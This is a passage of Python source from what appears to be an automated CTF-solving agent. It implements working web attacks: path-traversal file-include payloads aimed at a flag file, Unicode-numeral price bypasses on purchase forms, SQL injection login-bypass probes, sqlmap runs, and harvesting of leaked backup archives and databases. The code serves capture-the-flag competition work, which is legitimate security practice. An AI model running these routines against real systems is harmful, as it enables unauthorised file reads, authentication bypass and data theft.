                    base,
                    evidence_source="source-leak",
                    rationale=f"backup leak: {rel_path}",
                )
                if verification.decision == "verified":
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"backup leak: {rel_path}",
                    )

            if _looks_like_archive_path(rel_path, body) or _looks_like_inline_source_leak(body):
                analysis = await self._download_and_analyze_backup_artifact(
                    artifact_url,
                    base,
                )
                progress = progress or analysis.progress
                if analysis.flag:
                    return analysis
                if analysis.reason:
                    reasons.append(analysis.reason)

            if self._looks_like_warmup_include_source(body):
                warmup = await self._attempt_warmup_include_bypass(
                    base,
                    source_url=artifact_url,
                    source_body=body,
                    page_features=page_features,
                )
                progress = progress or warmup.progress
                if warmup.flag:
                    return warmup
                if warmup.reason:
                    reasons.append(warmup.reason)

        return _ChainOutcome(progress=progress, reason="; ".join(filter(None, reasons)))

    def _looks_like_warmup_include_source(self, body: str) -> bool:
        lowered = str(body or "").lower()
        return (
            "checkfile" in lowered
            and "include" in lowered
            and "$_request" in lowered
            and "source.php" in lowered
            and "hint.php" in lowered
        )

    async def _attempt_warmup_include_bypass(
        self,
        base: str,
        *,
        source_url: str,
        source_body: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        source_text = _strip_html_text(str(source_body or ""))
        candidate_files = self._extract_warmup_flag_filenames(source_text)

        hint_url = urljoin(base + "/", "hint.php")
        try:
            hint_resp = await self.runtime.proxy_action("get", url=hint_url, timeout=10)
        except Exception:
            hint_resp = {}
        hint_body = str((hint_resp or {}).get("body") or "") if isinstance(hint_resp, dict) else ""
        if hint_body:
            await self._scan_and_store(
                hint_body,
                hint_url,
                evidence_source="source-leak",
                page_features=page_features,
            )
            candidate_files.extend(self._extract_warmup_flag_filenames(hint_body))

        seen_files: set[str] = set()
        normalized_files: list[str] = []
        for candidate in candidate_files:
            normalized = str(candidate or "").strip().lstrip("/")
            if not normalized or normalized in seen_files:
                continue
            seen_files.add(normalized)
            normalized_files.append(normalized)

        if not normalized_files:
            return _ChainOutcome(progress=True, reason="warmup include source found but no flag filename hint")

        prefixes = ("source.php", "hint.php")
        traversal_prefixes = [
            "../" * depth
            for depth in range(4, 8)
        ]
        for filename in normalized_files[:4]:
            for prefix in prefixes:
                for traversal in traversal_prefixes:
                    payload = f"{prefix}?{traversal}{filename}"
                    url = urljoin(base + "/", "?file=" + quote(payload, safe="/"))
                    try:
                        resp = await self.runtime.proxy_action("get", url=url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    if not body:
                        continue
                    await self._scan_and_store(
                        body,
                        url,
                        evidence_source="response_body",
                        page_features=page_features,
                    )
                    flag = self._extract_flag(body)
                    if not flag:
                        continue
                    verification = await self._observe_flag(
                        flag,
                        base,
                        evidence_source="response_body",
                        rationale=f"warmup include bypass from {source_url}",
                        evidence_url=url,
                        evidence_snippet=body[:240],
                        replayable=True,
                        strategy_kind="backup_source_leak",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"warmup include bypass: {filename}",
                        )

        return _ChainOutcome(progress=True, reason="warmup include bypass exhausted")

    def _extract_warmup_flag_filenames(self, text: str) -> list[str]:
        blob = str(text or "")
        candidates: list[str] = []
        patterns = (
            r"flag\s+(?:not\s+here,\s+and\s+)?flag\s+in\s+([A-Za-z0-9_./-]{4,})",
            r"flag\s+(?:is\s+)?(?:in|at)\s+([A-Za-z0-9_./-]{4,})",
            r"\b([A-Za-z0-9_]*f{2,}l{2,}a{2,}g{2,}[A-Za-z0-9_./-]*)\b",
        )
        for pattern in patterns:
            for match in re.findall(pattern, blob, flags=re.IGNORECASE):
                normalized = str(match or "").strip().strip(".,;:'\"()[]{}")
                if normalized and normalized not in candidates:
                    candidates.append(normalized)
        return candidates

    async def _run_artifact_forensics_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request", "terminal"])

        candidates = self._collect_artifact_candidates(target, page_features)
        candidates = await self._expand_artifact_candidates_from_directory_pages(
            target=target,
            page_features=page_features,
            candidates=candidates,
        )
        if not candidates:
            return _ChainOutcome(progress=False, reason="artifact_forensics: no candidate attachments discovered")

        await self._collect_attachment_research_context(
            target=target,
            page_features=page_features,
            candidates=candidates,
            hint=hint,
        )

        progress = False
        reasons: list[str] = []
        for artifact_url in candidates[:12]:
            analysis = await self._analyze_attachment_artifact(artifact_url, target)
            progress = progress or analysis.progress
            if analysis.flag:
                return analysis
            if analysis.reason:
                reasons.append(analysis.reason)

        return _ChainOutcome(progress=progress, reason="; ".join(dict.fromkeys(reasons[:6])) or "artifact_forensics exhausted")

    def _collect_artifact_candidates(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[str]:
        base = _base_target(target)
        candidates: list[str] = []
        seen: set[str] = set()

        def _add(url: str) -> None:
            absolute = _normalize_exploration_url(str(url or "").strip())
            if not absolute:
                return
            lowered = absolute.lower()
            if not any(
                token in lowered
                for token in (
                    ".zip",
                    ".tar.gz",
                    ".tgz",
                    ".tar",
                    ".gz",
                    ".db",
                    ".sqlite",
                    ".sqlite3",
                    ".wal",
                    ".pcap",
                    ".cap",
                    ".7z",
                    ".rar",
                )
            ):
                return
            if absolute in seen:
                return
            seen.add(absolute)
            candidates.append(absolute)

        for raw in list(page_features.get("raw_links") or []):
            _add(str(raw))

        for rel_path in (
            "/challenge.zip",
            "/attachments.zip",
            "/source.zip",
            "/backup.zip",
            "/www.zip",
            "/app.db",
            "/app.db-wal",
        ):
            _add(urljoin(base + "/", rel_path.lstrip("/")))

        for artifact_path in (self._challenge_context or {}).get("artifactPaths") or []:
            path_value = str(artifact_path or "").strip()
            if not path_value:
                continue
            try:
                absolute_path = Path(path_value).resolve()
            except Exception:
                continue
            if not absolute_path.exists() or not absolute_path.is_file():
                continue
            _add(absolute_path.as_uri())

        return candidates

    def _ingest_local_challenge_artifacts(self, target: str) -> None:
        if self.state is None:
            return
        if self._local_challenge_artifacts_loaded:
            return

        target_label = urlparse(target).netloc or target
        challenge_path_value = str((self._challenge_context or {}).get("challengePath") or "").strip()
        if challenge_path_value:
            challenge_path = Path(challenge_path_value)
            if challenge_path.exists() and challenge_path.is_dir():
                challenge_artifact = self.state.add_artifact(
                    challenge_path.name or challenge_path_value,
                    location=str(challenge_path),
                    source="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "challenge_path_root",
                    },
                )
                self._register_artifact_record(
                    kind="local_challenge_root",
                    title=challenge_path.name or challenge_path_value,
                    path=str(challenge_path),
                    location=str(challenge_path),
                    producer="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "challenge_path_root",
                    },
                )
                self.state.add_observation(
                    "local_challenge_root",
                    str(challenge_path),
                    source="local_challenge_context",
                    metadata={
                        "artifact_name": challenge_artifact.name,
                        "target": target_label,
                    },
                )
                compose_file = _resolve_compose_file(challenge_path)
                if compose_file is not None and compose_file.exists() and compose_file.is_file():
                    compose_artifact = self.state.add_artifact(
                        compose_file.name or str(compose_file),
                        location=str(compose_file),
                        source="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_compose_file",
                            "source_root_path": str(challenge_path),
                        },
                    )
                    self._register_artifact_record(
                        kind="local_challenge_compose_file",
                        title=compose_file.name or str(compose_file),
                        path=str(compose_file),
                        location=str(compose_file),
                        producer="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_compose_file",
                            "source_root_path": str(challenge_path),
                        },
                    )
                    self.state.add_observation(
                        "local_challenge_compose_file",
                        str(compose_file),
                        source="local_challenge_context",
                        metadata={
                            "artifact_name": compose_artifact.name,
                            "target": target_label,
                            "source_root_path": str(challenge_path),
                        },
                    )
                for key_file in _iter_local_challenge_key_files(challenge_path):
                    key_artifact = self.state.add_artifact(
                        key_file.name or str(key_file),
                        location=str(key_file),
                        source="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_key_file",
                            "source_root_path": str(challenge_path),
                        },
                    )
                    self._register_artifact_record(
                        kind="local_challenge_key_file",
                        title=key_file.name or str(key_file),
                        path=str(key_file),
                        location=str(key_file),
                        producer="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_key_file",
                            "source_root_path": str(challenge_path),
                        },
                    )
                    self.state.add_observation(
                        "local_challenge_key_file",
                        str(key_file),
                        source="local_challenge_context",
                        metadata={
                            "artifact_name": key_artifact.name,
                            "target": target_label,
                            "source_root_path": str(challenge_path),
                        },
                    )
                summary_metadata = _build_local_challenge_root_summary_metadata(challenge_path)
                summary_artifact = self.state.add_artifact(
                    f"{challenge_path.name or challenge_path_value} summary",
                    location=str(challenge_path),
                    source="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "challenge_root_summary",
                        **summary_metadata,
                    },
                )
                self._register_artifact_record(
                    kind="local_challenge_root_summary",
                    title=f"{challenge_path.name or challenge_path_value} summary",
                    path=str(challenge_path),
                    location=str(challenge_path),
                    producer="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "challenge_root_summary",
                        **summary_metadata,
                    },
                )
                self.state.add_observation(
                    "local_challenge_root_summary",
                    str(challenge_path),
                    source="local_challenge_context",
                    metadata={
                        "artifact_name": summary_artifact.name,
                        "target": target_label,
                        **summary_metadata,
                    },
                )

        artifact_paths = list((self._challenge_context or {}).get("artifactPaths") or [])
        if not artifact_paths:
            return

        for artifact_path in artifact_paths:
            path_value = str(artifact_path or "").strip()
            if not path_value:
                continue
            path = Path(path_value)
            artifact = self.state.add_artifact(
                path.name or path_value,
                location=str(path),
                source="local_challenge_context",
                metadata={
                    "target": target_label,
                    "kind": "local_artifact_path",
                },
            )
            self._register_artifact_record(
                kind="local_challenge_artifact",
                title=path.name or path_value,
                path=str(path),
                location=str(path),
                producer="local_challenge_context",
                metadata={
                    "target": target_label,
                    "kind": "local_artifact_path",
                },
            )
            self.state.add_observation(
                "local_challenge_artifact",
                str(path),
                source="local_challenge_context",
                metadata={
                    "artifact_name": artifact.name,
                    "target": target_label,
                },
            )
            extracted_root = _extract_local_challenge_root_from_local_archive(path)
            if extracted_root is not None and extracted_root.exists() and extracted_root.is_dir():
                extracted_artifact = self.state.add_artifact(
                    extracted_root.name or str(extracted_root),
                    location=str(extracted_root),
                    source="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "extracted_challenge_root",
                        "source_artifact_path": str(path),
                    },
                )
                self._register_artifact_record(
                    kind="local_challenge_extracted_root",
                    title=extracted_root.name or str(extracted_root),
                    path=str(extracted_root),
                    location=str(extracted_root),
                    producer="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "extracted_challenge_root",
                        "source_artifact_path": str(path),
                    },
                )
                self.state.add_observation(
                    "local_challenge_extracted_root",
                    str(extracted_root),
                    source="local_challenge_context",
                    metadata={
                        "artifact_name": extracted_artifact.name,
                        "target": target_label,
                        "source_artifact_path": str(path),
                    },
                )
                compose_file = _resolve_compose_file(extracted_root)
                if compose_file is not None and compose_file.exists() and compose_file.is_file():
                    compose_artifact = self.state.add_artifact(
                        compose_file.name or str(compose_file),
                        location=str(compose_file),
                        source="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_compose_file",
                            "source_root_path": str(extracted_root),
                            "source_artifact_path": str(path),
                        },
                    )
                    self._register_artifact_record(
                        kind="local_challenge_compose_file",
                        title=compose_file.name or str(compose_file),
                        path=str(compose_file),
                        location=str(compose_file),
                        producer="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_compose_file",
                            "source_root_path": str(extracted_root),
                            "source_artifact_path": str(path),
                        },
                    )
                    self.state.add_observation(
                        "local_challenge_compose_file",
                        str(compose_file),
                        source="local_challenge_context",
                        metadata={
                            "artifact_name": compose_artifact.name,
                            "target": target_label,
                            "source_root_path": str(extracted_root),
                            "source_artifact_path": str(path),
                        },
                    )
                for key_file in _iter_local_challenge_key_files(extracted_root):
                    key_artifact = self.state.add_artifact(
                        key_file.name or str(key_file),
                        location=str(key_file),
                        source="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_key_file",
                            "source_root_path": str(extracted_root),
                            "source_artifact_path": str(path),
                        },
                    )
                    self._register_artifact_record(
                        kind="local_challenge_key_file",
                        title=key_file.name or str(key_file),
                        path=str(key_file),
                        location=str(key_file),
                        producer="local_challenge_context",
                        metadata={
                            "target": target_label,
                            "kind": "challenge_key_file",
                            "source_root_path": str(extracted_root),
                            "source_artifact_path": str(path),
                        },
                    )
                    self.state.add_observation(
                        "local_challenge_key_file",
                        str(key_file),
                        source="local_challenge_context",
                        metadata={
                            "artifact_name": key_artifact.name,
                            "target": target_label,
                            "source_root_path": str(extracted_root),
                            "source_artifact_path": str(path),
                        },
                    )
                summary_metadata = _build_local_challenge_root_summary_metadata(extracted_root)
                summary_artifact = self.state.add_artifact(
                    f"{extracted_root.name or str(extracted_root)} summary",
                    location=str(extracted_root),
                    source="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "challenge_root_summary",
                        "source_artifact_path": str(path),
                        **summary_metadata,
                    },
                )
                self._register_artifact_record(
                    kind="local_challenge_root_summary",
                    title=f"{extracted_root.name or str(extracted_root)} summary",
                    path=str(extracted_root),
                    location=str(extracted_root),
                    producer="local_challenge_context",
                    metadata={
                        "target": target_label,
                        "kind": "challenge_root_summary",
                        "source_artifact_path": str(path),
                        **summary_metadata,
                    },
                )
                self.state.add_observation(
                    "local_challenge_root_summary",
                    str(extracted_root),
                    source="local_challenge_context",
                    metadata={
                        "artifact_name": summary_artifact.name,
                        "target": target_label,
                        "source_artifact_path": str(path),
                        **summary_metadata,
                    },
                )
        self._local_challenge_artifacts_loaded = True

    async def _expand_artifact_candidates_from_directory_pages(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        candidates: list[str],
    ) -> list[str]:
        if self.runtime is None or not hasattr(self.runtime, "proxy_action"):
            return candidates

        expanded = list(candidates)
        seen_candidates = set(expanded)
        seen_dirs: set[str] = set()
        queue: list[tuple[str, int]] = []

        current_url = str(page_features.get("url") or target or "").strip()
        current_blob = (
            str(page_features.get("html") or "")
            + "\n"
            + str(page_features.get("content") or "")
        )
        if _ATTACHMENT_CLUE_RE.search(current_blob) and current_url.endswith("/"):
            queue.append((current_url, 0))

        for raw in list(page_features.get("raw_links") or []):
            absolute = _normalize_exploration_url(str(raw or "").strip())
            if not absolute or not absolute.endswith("/"):
                continue
            queue.append((absolute, 0))

        while queue:
            directory_url, depth = queue.pop(0)
            if directory_url in seen_dirs or depth > 1:
                continue
            seen_dirs.add(directory_url)
            try:
                resp = await self.runtime.proxy_action(
                    "get",
                    url=directory_url,
                    timeout=12,
                )
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            if int(resp.get("status_code") or 0) != 200:
                continue

            body = str(resp.get("body") or "")
            if not body:
                continue
            links = self._extract_embedded_links(body, directory_url)
            if links:
                self._ingest_discovered_links(
                    links,
                    page_features=page_features,
                    discovery_source="artifact_directory_listing",
                )
            for link in links:
                lowered = link.lower()
                if link.endswith("/") and depth < 1:
                    queue.append((link, depth + 1))
                    continue
                if not any(
                    token in lowered
                    for token in (
                        ".zip",
                        ".tar.gz",
                        ".tgz",
                        ".tar",
                        ".gz",
                        ".db",
                        ".sqlite",
                        ".sqlite3",
                        ".wal",
                        ".pcap",
                        ".cap",
                        ".7z",
                        ".rar",
                    )
                ):
                    continue
                if link in seen_candidates:
                    continue
                seen_candidates.add(link)
                expanded.append(link)

        return expanded

    async def _collect_attachment_research_context(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        candidates: list[str],
        hint: str,
    ) -> None:
        if self.state is None:
            return

        challenge_summary = " ".join(
            part
            for part in [
                str(page_features.get("content") or "")[:500],
                str(page_features.get("html") or "")[:500],
                " ".join(candidates[:6]),
                str(hint or ""),
            ]
            if part
        ).strip()
        if not challenge_summary:
            return

        try:
            from ...tools.knowledge_search import knowledge_search as _knowledge_search

            knowledge_result = await _knowledge_search(
                {
                    "query": f"CTF misc forensics attachment analysis {challenge_summary[:200]}",
                    "k": 3,
                    "threshold": 0.25,
                    "max_tokens": 1000,
                },
                self.runtime,
            )
            if knowledge_result and not str(knowledge_result).lower().startswith("knowledge search failed"):
                self.state.add_observation(
                    "knowledge_hint",
                    str(knowledge_result)[:1200],
                    source="knowledge_search",
                    metadata={"target": target, "category": "artifact_forensics"},
                )
        except Exception:
            pass

        try:
            from ...knowledge.ctf_hint_searcher import search_ctf_hints

            if self.llm is not None:
                hints = await search_ctf_hints("misc", challenge_summary[:220], self.llm, max_results=2)
                if hints:
                    self.state.add_observation(
                        "web_search_hint",
                        " | ".join(hints[:5]),
                        source="ctf_hint_searcher",
                        metadata={"target": target, "category": "artifact_forensics"},
                    )
        except Exception:
            pass

    async def _analyze_attachment_artifact(
        self,
        artifact_url: str,
        target: str,
    ) -> _ChainOutcome:
        import shlex
        import subprocess
        import tempfile

        python_cmd = _pick_python_command(self.runtime)
        script = r"""
import base64, binascii, io, json, os, re, sqlite3, sys, tempfile, urllib.request, zipfile

url = sys.argv[1]
flag_re = re.compile(r'([A-Za-z][A-Za-z0-9_]{1,20}\{[A-Za-z0-9_!@#$%^&*+=:.,?\-]{3,200}\})')
part_re = re.compile(r'part[:\s_\-]*0*(\d+).*?\[([A-Za-z0-9+/=]{4,})\]', re.IGNORECASE)
b64_re = re.compile(r'(?<![A-Za-z0-9+/=])([A-Za-z0-9+/]{8,}={0,2})(?![A-Za-z0-9+/=])')

data = urllib.request.urlopen(url, timeout=8).read()
result = {
    "url": url,
    "kind": "raw",
    "entries": [],
    "interesting": [],
    "flags": [],
    "decoded_hits": [],
    "part_fragments": [],
    "table_samples": [],
}

seen_flags = set()

def add_flag(candidate):
    candidate = str(candidate or "").strip()
    if candidate and candidate not in seen_flags:
        seen_flags.add(candidate)
        result["flags"].append(candidate)

def scan_text(name, text):
    if not text:
        return
    for match in flag_re.finditer(text):
        add_flag(match.group(1))
    for index, blob in part_re.findall(text):
        result["part_fragments"].append({"index": int(index), "blob": blob, "name": name})
    for blob in b64_re.findall(text):
        if len(blob) < 12:
            continue
        try:
            decoded = base64.b64decode(blob + "=" * ((4 - len(blob) % 4) % 4), validate=False)
        except Exception:
            continue
        decoded_text = decoded.decode("utf-8", errors="ignore")
        for match in flag_re.finditer(decoded_text):
            add_flag(match.group(1))
            result["decoded_hits"].append({"name": name, "source": blob[:48], "decoded": decoded_text[:180]})

def scan_bytes(name, raw):
    if raw is None:
        return
    text = raw.decode("utf-8", errors="ignore")
    if not text:
        text = raw.decode("latin-1", errors="ignore")
    scan_text(name, text)

def analyze_sqlite_bytes(name, raw):
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    try:
        with open(path, "wb") as handle:
            handle.write(raw)
        conn = None
        try:
            conn = sqlite3.connect(path)
            cur = conn.cursor()
            tables = [row[0] for row in cur.execute("select name from sqlite_master where type='table' order by name").fetchall()]
            result["table_samples"].append({"name": name, "tables": tables[:10]})
            for table in tables[:8]:
                try:
                    rows = cur.execute(f"select * from \"{table}\" limit 8").fetchall()
                except Exception:
                    continue
                joined = "\n".join(" | ".join("" if item is None else str(item) for item in row) for row in rows)
                scan_text(f"{name}:{table}", joined)
        except Exception as exc:
            result["table_samples"].append({"name": name, "error": str(exc)[:160]})
        finally:
            if conn is not None:
                conn.close()
    finally:
        try:
            os.remove(path)
        except Exception:
            pass

scan_bytes(url, data)

if zipfile.is_zipfile(io.BytesIO(data)):
    result["kind"] = "zip"
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        for info in zf.infolist():
            result["entries"].append(info.filename)
            if info.is_dir() or info.file_size > 1048576:
                continue
            raw = zf.read(info.filename)
            lowered = info.filename.lower()
            if any(token in lowered for token in (".db", ".sqlite", ".sqlite3", ".wal", ".txt", ".log", ".md", ".php", ".env", ".bak")):
                result["interesting"].append(info.filename)
            scan_bytes(info.filename, raw)
            if lowered.endswith((".db", ".sqlite", ".sqlite3")):
                analyze_sqlite_bytes(info.filename, raw)
else:
    lowered_url = url.lower()
    if lowered_url.endswith((".db", ".sqlite", ".sqlite3")):
        result["kind"] = "sqlite"
        analyze_sqlite_bytes(url, data)
    elif lowered_url.endswith(".wal"):
        result["kind"] = "wal"

if result["part_fragments"]:
    ordered = []
    seen_indexes = set()
    for item in sorted(result["part_fragments"], key=lambda item: item["index"]):
        idx = int(item["index"])
        if idx in seen_indexes:
            continue
        seen_indexes.add(idx)
        ordered.append(item["blob"])
    joined = "".join(ordered)
    try:
        decoded = base64.b64decode(joined + "=" * ((4 - len(joined) % 4) % 4), validate=False)
        decoded_text = decoded.decode("utf-8", errors="ignore")
        for match in flag_re.finditer(decoded_text):
            add_flag(match.group(1))
            result["decoded_hits"].append({"name": "joined_fragments", "source": joined[:80], "decoded": decoded_text[:180]})
    except (ValueError, binascii.Error):
        pass

print(json.dumps(result, ensure_ascii=False))
""".strip()

        fd, script_path = tempfile.mkstemp(
            suffix=".py",
            prefix="flaghunter_artifact_forensics_",
        )
        os.close(fd)
        try:
            with open(script_path, "w", encoding="utf-8", newline="\n") as handle:
                handle.write(script)

            args = [python_cmd, script_path, artifact_url]
            if os.name == "nt":
                command = subprocess.list2cmdline(args)
            else:
                command = " ".join(shlex.quote(arg) for arg in args)

            result = await self.runtime.execute_command(command, timeout=90)
        finally:
            try:
                os.remove(script_path)
            except Exception:
                pass
        text = "\n".join(
            part
            for part in [getattr(result, "stdout", ""), getattr(result, "stderr", "")]
            if part
        ).strip()
        if not text or getattr(result, "exit_code", 1) != 0:
            return _ChainOutcome(progress=False, reason=f"artifact_forensics failed: {artifact_url}")

        await self._scan_and_store(text, target, evidence_source="command-output")
        try:
            analysis = json.loads(text.splitlines()[-1])
        except Exception:
            if flag := self._extract_flag(text):
                verification = await self._observe_flag(
                    flag,
                    target,
                    evidence_source="command-output",
                    rationale=f"attachment analysis recovered runtime flag via {artifact_url}",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(progress=True, flag=verification.flag, reason=f"artifact_forensics flag: {artifact_url}")
            return _ChainOutcome(progress=True, reason=f"artifact_forensics analyzed: {artifact_url}")

        await self._store_note(
            key="ctf_artifact_forensics",
            value=json.dumps(
                {
                    "url": analysis.get("url"),
                    "kind": analysis.get("kind"),
                    "entries": (analysis.get("entries") or [])[:20],
                    "interesting": (analysis.get("interesting") or [])[:20],
                    "decoded_hits": (analysis.get("decoded_hits") or [])[:5],
                    "tables": (analysis.get("table_samples") or [])[:5],
                },
                ensure_ascii=False,
            ),
            category="artifact",
            target=urlparse(target).netloc or target,
            url=artifact_url,
            strategy_kind="artifact_forensics",
        )
        if self.state is not None:
            self.state.add_observation(
                "artifact_forensics_summary",
                json.dumps(
                    {
                        "url": analysis.get("url"),
                        "kind": analysis.get("kind"),
                        "interesting": (analysis.get("interesting") or [])[:10],
                        "entries": (analysis.get("entries") or [])[:10],
                    },
                    ensure_ascii=False,
                ),
                source="artifact_forensics",
                metadata={"url": artifact_url},
            )

        for flag in list(analysis.get("flags") or []):
            verification = await self._observe_flag(
                str(flag),
                target,
                evidence_source="command-output",
                rationale=f"attachment analysis recovered runtime flag via {artifact_url}",
            )
            if verification.decision in {"verified", "runtime"}:
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason=f"artifact_forensics flag: {artifact_url}",
                )
        return _ChainOutcome(progress=True, reason=f"artifact_forensics analyzed: {artifact_url}")

    async def _run_unicode_numeric_form_bypass_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        forms = list(page_features.get("forms") or [])
        candidate_form = None
        for form in forms:
            if not isinstance(form, dict):
                continue
            input_names = {
                str(item.get("name") or "").strip().lower()
                for item in (form.get("inputs") or [])
                if isinstance(item, dict) and str(item.get("name") or "").strip()
            }
            action = str(form.get("action") or "").strip().lower()
            if {"id", "price"}.issubset(input_names) and ("/charge" in action or action.endswith("charge")):
                candidate_form = form
                break

        if candidate_form is None:
            for form in forms:
                if not isinstance(form, dict):
                    continue
                input_names = {
                    str(item.get("name") or "").strip().lower()
                    for item in (form.get("inputs") or [])
                    if isinstance(item, dict) and str(item.get("name") or "").strip()
                }
                if {"id", "price"}.issubset(input_names):
                    candidate_form = form
                    break

        if candidate_form is None:
            return _ChainOutcome(progress=False, reason="unicode numeric bypass: purchase form not found")

        strategy_kind = "unicode_numeric_form_bypass"
        action_url = str(candidate_form.get("action") or "").strip() or target
        if not action_url:
            action_url = target
        action_url = urljoin(target if target.endswith("/") else target + "/", action_url)

        baseline_fields = {"id": "4", "price": "1"}
        baseline_resp, _ = await self._submit_form_request(target, candidate_form, baseline_fields)
        baseline_body = str((baseline_resp or {}).get("body") or "")
        baseline_status = int((baseline_resp or {}).get("status_code") or 0)
        await self._scan_and_store(baseline_body, action_url, evidence_source="http-response", page_features=page_features)
        if self.state is not None and baseline_body:
            self.state.add_observation(
                "unicode_numeric_baseline",
                baseline_body[:240],
                source=strategy_kind,
                metadata={
                    "strategy_kind": strategy_kind,
                    "url": action_url,
                    "status_code": baseline_status,
                    "fields": dict(baseline_fields),
                },
            )

        progress = bool(baseline_body)
        failure_markers = ("not enough money", "only one char", "one char", "余额", "money")
        if baseline_body and any(marker in baseline_body.lower() for marker in failure_markers):
            progress = True

        candidate_payloads = ("万", "萬", "፼", "ↈ")
        reasons: list[str] = []
        baseline_lower = baseline_body.lower()
        for payload in candidate_payloads:
            attempt_fields = {"id": "4", "price": payload}
            response, request_url = await self._submit_form_request(
                target,
                candidate_form,
                attempt_fields,
            )
            body = str((response or {}).get("body") or "")
            status_code = int((response or {}).get("status_code") or 0)
            await self._scan_and_store(body, request_url, evidence_source="http-response", page_features=page_features)
            if self.state is not None and body:
                self.state.add_observation(
                    "unicode_numeric_probe",
                    body[:240],
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "url": request_url,
                        "status_code": status_code,
                        "fields": dict(attempt_fields),
                        "payload": payload,
                    },
                )

            self._emit(f"[CTF dispatcher] unicode numeric probe price={payload!r} -> {request_url}")

            if extracted_flag := self._extract_flag(body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"unicode numeric form bypass via price={payload}",
                    evidence_url=request_url,
                    evidence_snippet=body[:240],
                    strategy_kind=strategy_kind,
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"unicode numeric form bypass via price={payload}",
                    )
                progress = True
                reasons.append(f"unicode numeric payload {payload} produced {verification.decision} flag")
                continue

            lowered = body.lower()
            if body and lowered != baseline_lower:
                progress = True
                reasons.append(f"unicode numeric payload {payload} changed response")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons) if reasons else "unicode numeric payloads exhausted",
        )

    async def _attempt_auth_form_sqli(
        self,
        target: str,
        auth_form: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field or not password_field:
            return _ChainOutcome(progress=False, reason="auth form fields incomplete")

        baseline_fields = {
            username_field: "ctf_probe_user",
            password_field: "ctf_probe_pass",
        }
        baseline_resp, _ = await self._submit_form_request(
            target, auth_form, baseline_fields
        )
        baseline_body = str((baseline_resp or {}).get("body") or "")
        await self._scan_and_store(baseline_body, target, evidence_source="http-response")
        progress = bool(baseline_body)
        reasons: list[str] = []

        for payload in _SQLI_AUTH_BYPASS_PAYLOADS:
            attempt_fields = {
                username_field: payload,
                password_field: "1",
            }
            response, request_url = await self._submit_form_request(
                target, auth_form, attempt_fields
            )
            body = str((response or {}).get("body") or "")
            await self._scan_and_store(body, target, evidence_source="http-response")
            self._emit(
                f"[CTF dispatcher] SQLi auth probe {username_field}={payload!r} -> {request_url}"
            )
            extracted_flag = self._extract_flag(body)
            if extracted_flag:
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale="auth form SQLi bypass",
                )
                if verification.decision == "verified":
                    await self._store_note(
                        key="ctf_sqli_auth_bypass",
                        value=f"auth form bypass succeeded via {username_field}={payload}",
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=request_url,
                        weaknesses=[
                            {
                                "id": "sqli-auth-bypass",
                                "description": "Authentication form accepted a SQL injection login bypass payload.",
                            }
                        ],
                    )
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason="auth form SQLi bypass",
                    )
                if verification.decision in {"runtime", "candidate"}:
                    progress = True
                    reasons.append(f"auth form produced {verification.decision} flag")
                    continue

            if _looks_like_successful_auth_change(response, baseline_resp):
                await self._store_note(
                    key="ctf_sqli_auth_signal",
                    value=f"response diverged for payload {payload}",
                    category="finding",
                    target=urlparse(target).netloc or target,
                    url=request_url,
                )
                return _ChainOutcome(
                    progress=True,
                    reason="auth form response changed under SQLi payload",
                )

        fallback_reason = "auth-form probes exhausted"
        if reasons:
            fallback_reason = "; ".join(reasons + [fallback_reason])
        return _ChainOutcome(progress=progress, reason=fallback_reason)

    async def _attempt_sqlmap_sqli(
        self,
        target: str,
        *,
        auth_form: dict[str, Any] | None = None,
    ) -> _ChainOutcome:
        self.tool_guard.require(["sqlmap"])
        try:
            from ...tools.sqlmap import run_sqlmap
        except Exception as exc:
            return _ChainOutcome(progress=False, reason=f"sqlmap tool unavailable: {exc}")

        sqlmap_url = target
        sqlmap_data = ""

        if auth_form:
            sqlmap_url, sqlmap_data = _build_sqlmap_target_from_form(target, auth_form)

